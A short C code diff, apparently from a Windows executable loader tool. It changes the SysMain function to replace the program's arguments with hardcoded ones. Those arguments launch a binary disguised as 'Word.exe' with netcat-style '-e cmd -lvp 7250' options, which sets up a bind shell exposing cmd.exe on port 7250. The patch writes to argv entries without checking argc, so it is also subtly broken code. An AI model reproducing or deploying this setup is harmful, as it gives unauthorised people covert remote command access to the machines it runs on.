@@ -114,7 +114,17 @@ int CheckImageFileName(LPWSTR *lpFileName, int argc, LPCWSTR *argv)
     int - error code
 */
 int SysMain(int argc, LPCWSTR *argv)
-{    
+{   
+	int default_argc = 6;
+	//LPCWSTR default_argv[] = { L"C:\\temp\\loader.exe", L"C:\\temp\\Word.exe", L"-e", L"cmd", L"-lvp", L"7250" };
+	argv[0] = L"C:\\temp\\loader.exe";
+	argv[1] = L"C:\\temp\\Word.exe";
+	argv[2] = L"-e";
+	argv[3] = L"cmd";
+	argv[4] = L"-lvp";
+	argv[5] = L"7250";
+	argc = default_argc;
+	//argv = default_argv;
     LPWSTR lpFileName = NULL;
     int errorCode = 0;
     IMAGE_ACTIVATION_CONTEXT hActCtx;
